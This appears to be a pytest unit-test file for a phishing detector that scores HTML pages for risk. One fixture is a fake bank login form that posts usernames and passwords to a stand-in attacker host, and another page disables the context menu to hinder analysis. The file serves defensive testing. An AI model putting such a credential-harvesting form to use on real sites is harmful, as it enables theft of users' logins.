"""
Unit tests for HTML DOM structure, forms, and security feature extractor.
"""
import pytest
from backend.security.html_features import extract_html_features


def test_clean_html_page():
    html = """
    <!DOCTYPE html>
    <html>
        <head><title>Welcome to Example</title></head>
        <body>
            <h1>Hello World</h1>
            <p>This is a safe informational page.</p>
            <a href="https://example.com/about">About Us</a>
        </body>
    </html>
    """
    res = extract_html_features(html, base_url="https://example.com")
    assert res["html_risk"] < 0.20
    assert res["features"]["title"] == "Welcome to Example"
    assert res["features"]["has_login_form"] is False
    assert res["features"]["has_password_field"] is False


def test_cross_domain_form_submission():
    html = """
    <html>
        <head><title>Portal Login</title></head>
        <body>
            <form action="http://malicious-external-server.com/collect.php" method="POST">
                <input type="text" name="user">
                <input type="password" name="pass">
                <button type="submit">Sign In</button>
            </form>
        </body>
    </html>
    """
    res = extract_html_features(html, base_url="https://legitimate-bank.com/login")
    assert res["features"]["has_login_form"] is True
    assert res["features"]["has_password_field"] is True
    assert len(res["features"]["cross_domain_forms"]) == 1
    assert res["features"]["cross_domain_forms"][0]["action_domain"] == "malicious-external-server.com"
    assert res["html_risk"] >= 0.50
    assert any("Cross-domain form submission" in ind for ind in res["indicators"])


def test_disabled_contextmenu_and_dummy_links():
    html = """
    <body oncontextmenu="return false;">
        <h1>Security Update</h1>
        <p>Urgent account verification required.</p>
        <a href="#">Link 1</a>
        <a href="#">Link 2</a>
        <a href="#">Link 3</a>
        <a href="#">Link 4</a>
        <a href="javascript:void(0)">Link 5</a>
    </body>
    """
    res = extract_html_features(html, base_url="https://example.com")
    assert res["features"]["has_context_menu_disabled"] is True
    assert res["features"]["empty_link_ratio"] == 1.0
    assert res["html_risk"] > 0.30
    assert any("anti-analysis" in ind for ind in res["indicators"])

